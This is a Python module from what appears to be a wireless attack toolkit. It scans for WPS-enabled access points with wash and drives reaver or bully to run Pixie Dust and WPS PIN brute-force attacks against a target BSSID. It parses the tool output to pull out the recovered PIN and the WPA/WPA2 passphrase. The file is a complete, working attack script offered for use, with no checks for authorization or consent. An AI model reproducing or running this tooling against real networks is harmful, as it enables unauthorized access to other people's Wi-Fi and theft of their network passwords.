"""WPS PIN attack module - brute-forces WPS PIN to recover WPA password.

Many routers have WPS (Wi-Fi Protected Setup) enabled, which uses an 8-digit
PIN for quick device pairing. This PIN is vulnerable to brute-force due to:

1. The PIN is validated in two halves (4+3 digits + 1 checksum digit)
2. This reduces keyspace from 10^8 (100M) to 10^4 + 10^3 = 11,000 attempts
3. Each attempt takes ~1-3 seconds -> full brute-force in 3-9 hours

This module wraps `reaver` and `bully`, the two main WPS attack tools.
If the PIN is recovered, it also reveals the WPA/WPA2 passphrase.

Limitations:
- Some APs have WPS lockout after failed attempts (rate limiting)
- Some APs have WPS disabled or don't support it
- Newer APs may have patched the vulnerability
- Requires a monitor-mode capable interface
"""

import os
import re
import subprocess
import threading
import time

from config import find_binary, CAPTURES_DIR
from utils import print_status, print_success, print_error, print_warning, print_info, Colors

REAVER_BIN = find_binary("reaver")
BULLY_BIN = find_binary("bully")
WASH_BIN = find_binary("wash")


class WPSScanner:
    """Scans for WPS-enabled access points using wash."""

    def __init__(self, interface):
        self.interface = interface
        self.wps_networks = []

    def scan(self, timeout=30):
        """Scan for WPS-enabled networks.

        Args:
            timeout: Scan duration in seconds.

        Returns:
            list[dict]: List of WPS-enabled networks with bssid, ssid, channel,
                        wps_version, wps_locked status.
        """
        self.wps_networks.clear()

        if not WASH_BIN:
            print_error("wash not found. Install reaver: sudo apt install reaver")
            return []

        print_status(f"Scanning for WPS-enabled networks ({timeout}s)...")

        try:
            result = subprocess.run(
                [WASH_BIN, "-i", self.interface, "-s"],
                capture_output=True, text=True, timeout=timeout + 5
            )

            for line in result.stdout.splitlines():
                line = line.strip()
                # Skip header lines
                if not line or line.startswith("BSSID") or line.startswith("---"):
                    continue

                parts = line.split()
                if len(parts) >= 5:
                    bssid = parts[0]
                    channel = parts[1]
                    # WPS version and locked status positions vary
                    wps_version = parts[3] if len(parts) > 3 else "?"
                    locked = "Yes" in line

                    # SSID is typically the last field(s)
                    ssid = " ".join(parts[5:]) if len(parts) > 5 else "Unknown"

                    self.wps_networks.append({
                        "bssid": bssid,
                        "channel": int(channel) if channel.isdigit() else 0,
                        "ssid": ssid,
                        "wps_version": wps_version,
                        "locked": locked,
                    })

        except subprocess.TimeoutExpired:
            pass
        except FileNotFoundError:
            print_error("wash binary not found.")
            return []

        return self.wps_networks

    def print_results(self):
        """Print WPS scan results."""
        if not self.wps_networks:
            print_info("No WPS-enabled networks found.")
            return

        print(f"\n{Colors.BOLD}{'BSSID':<20s}{'SSID':<30s}{'CH':<6s}"
              f"{'WPS':<8s}{'Locked'}{Colors.RESET}")
        print("-" * 80)

        for net in self.wps_networks:
            locked_str = f"{Colors.RED}LOCKED{Colors.RESET}" if net["locked"] else f"{Colors.GREEN}Open{Colors.RESET}"
            print(f"  {net['bssid']:<20s}{net['ssid']:<30s}{net['channel']:<6d}"
                  f"{net['wps_version']:<8s}{locked_str}")

        print(f"\n{Colors.BOLD}Total: {len(self.wps_networks)} WPS networks.{Colors.RESET}")


class WPSAttack:
    """Brute-forces WPS PIN using reaver or bully.

    Attempts all possible WPS PINs until the correct one is found,
    which then reveals the WPA/WPA2 passphrase.
    """

    def __init__(self, interface, bssid, channel=None, ssid=None):
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.ssid = ssid
        self.process = None
        self.pin = None
        self.password = None
        self._stop_event = threading.Event()

    def _check_tools(self):
        """Check if reaver or bully is available."""
        if REAVER_BIN:
            return "reaver"
        if BULLY_BIN:
            return "bully"
        print_error("Neither reaver nor bully found.")
        print_info("Install: sudo apt install reaver")
        print_info("Or:      sudo apt install bully")
        return None

    def attack_reaver(self, pin=None, pixie_dust=False, delay=1, timeout=None):
        """Run reaver WPS brute-force attack.

        Args:
            pin: Specific PIN to try (skip brute-force).
            pixie_dust: Use Pixie Dust attack (offline, much faster).
            delay: Seconds between PIN attempts (default: 1).
            timeout: Max duration in seconds (None = unlimited).

        Returns:
            tuple: (pin, password) if successful, (None, None) otherwise.
        """
        if not REAVER_BIN:
            print_error("reaver not found. Install: sudo apt install reaver")
            return None, None

        cmd = [
            REAVER_BIN,
            "-i", self.interface,
            "-b", self.bssid,
            "-v",           # Verbose
            "-d", str(delay),
            "-S",           # Use small DH keys (faster)
        ]

        if self.channel:
            cmd.extend(["-c", str(self.channel)])

        if pin:
            cmd.extend(["-p", pin])

        if pixie_dust:
            cmd.extend(["-K", "1"])  # Pixie Dust attack
            print_status("Starting Pixie Dust attack (offline WPS crack)...")
            print_info("  This exploits weak random number generation in some APs.")
            print_info("  If it works, it's near-instant. If not, fallback to brute-force.")
        else:
            print_status("Starting WPS PIN brute-force attack...")
            print_warning("  This can take 3-9 hours for full keyspace (11,000 PINs).")
            print_info("  Some APs lock WPS after too many failures.")

        print_info(f"  Target: {self.bssid}")
        print_info(f"  Delay: {delay}s between attempts")
        print()

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            output_lines = []
            start_time = time.time()

            for line in self.process.stdout:
                if self._stop_event.is_set():
                    self.process.terminate()
                    return None, None

                if timeout and (time.time() - start_time) > timeout:
                    print_warning("Timeout reached.")
                    self.process.terminate()
                    break

                line = line.rstrip()
                output_lines.append(line)

                # Show progress
                if "Trying pin" in line:
                    print(f"  {Colors.CYAN}{line}{Colors.RESET}", end="\r")
                elif "WPS PIN:" in line or "Pin:" in line:
                    print(f"\n  {Colors.GREEN}{line}{Colors.RESET}")
                elif "WPA PSK:" in line or "PSK:" in line:
                    print(f"  {Colors.GREEN}{line}{Colors.RESET}")
                elif "WARNING" in line or "Locked" in line.lower():
                    print(f"  {Colors.YELLOW}{line}{Colors.RESET}")
                elif "rate limit" in line.lower() or "lockout" in line.lower():
                    print(f"  {Colors.RED}{line}{Colors.RESET}")

            self.process.wait()
            return self._parse_reaver_output("\n".join(output_lines))

        except FileNotFoundError:
            print_error("reaver binary not found.")
            return None, None
        except subprocess.SubprocessError as e:
            print_error(f"reaver error: {e}")
            return None, None

    def attack_bully(self, pixie_dust=False, timeout=None):
        """Run bully WPS attack (alternative to reaver).

        Args:
            pixie_dust: Use Pixie Dust attack.
            timeout: Max duration in seconds.

        Returns:
            tuple: (pin, password) if successful, (None, None) otherwise.
        """
        if not BULLY_BIN:
            print_error("bully not found. Install: sudo apt install bully")
            return None, None

        cmd = [
            BULLY_BIN,
            self.interface,
            "-b", self.bssid,
            "-v", "3",      # Verbosity level
        ]

        if self.channel:
            cmd.extend(["-c", str(self.channel)])

        if pixie_dust:
            cmd.extend(["-d"])  # Pixie Dust mode
            print_status("Starting bully Pixie Dust attack...")
        else:
            print_status("Starting bully WPS brute-force attack...")

        print_info(f"  Target: {self.bssid}")
        print()

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            output_lines = []
            start_time = time.time()

            for line in self.process.stdout:
                if self._stop_event.is_set():
                    self.process.terminate()
                    return None, None

                if timeout and (time.time() - start_time) > timeout:
                    self.process.terminate()
                    break

                line = line.rstrip()
                output_lines.append(line)

                if "pin:" in line.lower() or "key:" in line.lower():
                    print(f"  {Colors.GREEN}{line}{Colors.RESET}")
                elif "trying" in line.lower():
                    print(f"  {Colors.CYAN}{line}{Colors.RESET}", end="\r")

            self.process.wait()
            return self._parse_bully_output("\n".join(output_lines))

        except (FileNotFoundError, subprocess.SubprocessError) as e:
            print_error(f"bully error: {e}")
            return None, None

    def attack(self, pixie_dust=True, delay=1, timeout=None):
        """Run WPS attack using best available tool.

        Tries Pixie Dust first (fast), then falls back to brute-force.

        Args:
            pixie_dust: Attempt Pixie Dust first.
            delay: Delay between attempts for brute-force.
            timeout: Max timeout in seconds.

        Returns:
            tuple: (pin, password) or (None, None).
        """
        tool = self._check_tools()
        if not tool:
            return None, None

        # Try Pixie Dust first (works in seconds if vulnerable)
        if pixie_dust:
            print_status("Phase 1: Trying Pixie Dust attack (fast)...")
            if tool == "reaver":
                pin, password = self.attack_reaver(pixie_dust=True, timeout=120)
            else:
                pin, password = self.attack_bully(pixie_dust=True, timeout=120)

            if pin:
                self.pin = pin
                self.password = password
                return pin, password

            print_warning("Pixie Dust failed. AP not vulnerable to offline attack.")
            print()

        # Fall back to brute-force
        print_status("Phase 2: WPS PIN brute-force...")
        if tool == "reaver":
            pin, password = self.attack_reaver(delay=delay, timeout=timeout)
        else:
            pin, password = self.attack_bully(timeout=timeout)

        self.pin = pin
        self.password = password
        return pin, password

    def _parse_reaver_output(self, output):
        """Parse reaver output for PIN and password."""
        pin = None
        password = None

        # Look for WPS PIN
        pin_match = re.search(r"WPS PIN:\s*'?(\d{8})'?", output)
        if pin_match:
            pin = pin_match.group(1)

        # Look for WPA PSK
        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", output)
        if psk_match:
            password = psk_match.group(1)

        if pin and password:
            print()
            print_success(f"WPS PIN found: {pin}")
            print_success(f"WPA Password: {Colors.BOLD}{Colors.GREEN}{password}{Colors.RESET}")
        elif pin:
            print_success(f"WPS PIN found: {pin}")
            print_warning("WPA password not recovered (try re-running with the PIN).")
        else:
            # Check for failure reasons
            if "WPS transaction failed" in output:
                print_warning("WPS transaction failures detected. AP may have rate limiting.")
            if "Detected AP rate limiting" in output:
                print_warning("AP rate limiting detected. Attack will be very slow.")
            if "pin cracked" not in output.lower() and "wps pin" not in output.lower():
                print_warning("WPS PIN not found.")

        return pin, password

    def _parse_bully_output(self, output):
        """Parse bully output for PIN and password."""
        pin = None
        password = None

        pin_match = re.search(r"Pin:\s*(\d{8})", output, re.IGNORECASE)
        if pin_match:
            pin = pin_match.group(1)

        key_match = re.search(r"Key:\s*(.+?)$", output, re.MULTILINE | re.IGNORECASE)
        if key_match:
            password = key_match.group(1).strip().strip("'\"")

        if pin and password:
            print()
            print_success(f"WPS PIN: {pin}")
            print_success(f"WPA Password: {Colors.BOLD}{Colors.GREEN}{password}{Colors.RESET}")

        return pin, password

    def stop(self):
        """Stop the WPS attack."""
        self._stop_event.set()
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
        print_warning("WPS attack stopped.")
